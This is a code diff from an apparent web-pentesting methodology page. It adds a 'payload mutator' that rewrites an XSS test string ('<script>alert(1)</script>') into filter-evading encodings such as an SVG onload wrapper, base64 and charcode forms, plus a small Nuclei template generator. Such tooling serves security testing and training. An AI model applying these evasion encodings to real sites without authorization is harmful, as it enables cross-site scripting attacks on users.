   </div> <!-- end methodology-app -->
 <!-- Popup Modal structure for alert testing -->
@@ -10121,6 +10665,93 @@ function copyOneLiner(btn) {
   navigator.clipboard.writeText(cmd);
   alert('One-Liner Copied to Clipboard!');
 }
+</script>
+
+
+<script>
+// Payload Mutator Helper
+function mutatePayload() {
+  const raw = document.getElementById('pm-raw-input').value || '<script>alert(1)</script>';
+  const grid = document.getElementById('pm-out-grid');
+  if (!grid) return;
+
+  const encURL = encodeURIComponent(raw);
+  const encDoubleURL = encodeURIComponent(encodeURIComponent(raw));
+  const encB64 = btoa(raw);
+  const encHex = Array.from(raw).map(c => '%' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
+  const encHtmlHex = Array.from(raw).map(c => '&#x' + c.charCodeAt(0).toString(16) + ';').join('');
+  const encUnicode = Array.from(raw).map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join('');
+  const encCharCode = 'String.fromCharCode(' + Array.from(raw).map(c => c.charCodeAt(0)).join(',') + ')';
+  const encSVG = `<svg onload="${raw}">`;
+
+  const formats = [
+    { title: 'Standard URL Encoded', val: encURL },
+    { title: 'Double URL Encoded', val: encDoubleURL },
+    { title: 'Base64 Encoded', val: encB64 },
+    { title: 'Hex Encoded', val: encHex },
+    { title: 'HTML Entity Hex', val: encHtmlHex },
+    { title: 'Unicode Encoded', val: encUnicode },
+    { title: 'JS String.fromCharCode', val: encCharCode },
+    { title: 'SVG Onload Wrapper', val: encSVG }
+  ];
+
+  let html = '';
+  formats.forEach(f => {
+    html += `
+      <div style="background:#040914; padding:8px; border-radius:6px; border:1px solid rgba(0,229,255,0.15);">
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
+          <span style="color:#00e5ff; font-weight:bold; font-size:0.75rem;">${f.title}</span>
+          <button onclick="copyPmVal(this)" data-val="${f.val.replace(/"/g, '&quot;')}" style="background:var(--accent-cyan); color:#000; border:none; padding:2px 6px; border-radius:3px; font-weight:bold; font-size:0.65rem; cursor:pointer;">Copy</button>
+        </div>
+        <textarea readonly style="width:100%; height:40px; background:#090d16; color:#e2e8f0; font-family:monospace; border:none; border-radius:3px; padding:4px; font-size:0.7rem; resize:none;">${f.val}</textarea>
+      </div>
+    `;
+  });
+  grid.innerHTML = html;
+}
+
+function copyPmVal(btn) {
+  const val = btn.getAttribute('data-val');
+  navigator.clipboard.writeText(val);
+  alert('Copied to Clipboard!');
+}
+
+// Nuclei Generator Helper
+function generateNucleiYaml() {
+  const id = document.getElementById('nuc-id').value || 'custom-cve-check';
+  const sev = document.getElementById('nuc-sev').value;
+  const yaml = `id: ${id}
+
+info:
+  name: Custom Check for ${id}
+  author: abdo-cyber-academy
+  severity: ${sev}
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/v1/debug"
+    matchers:
+      - type: status
+        status:
+          - 200`;
+  const out = document.getElementById('nuc-yaml-out');
+  if (out) out.value = yaml;
+}
+
+// One-Liner Copy Helper
+function copyOneLiner(btn) {
+  const cmd = btn.getAttribute('data-cmd');
+  navigator.clipboard.writeText(cmd);
+  alert('One-Liner Copied to Clipboard!');
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+  setTimeout(() => {
+    mutatePayload();
+    generateNucleiYaml();
+  }, 500);
+});
 </script>
 
 </body>
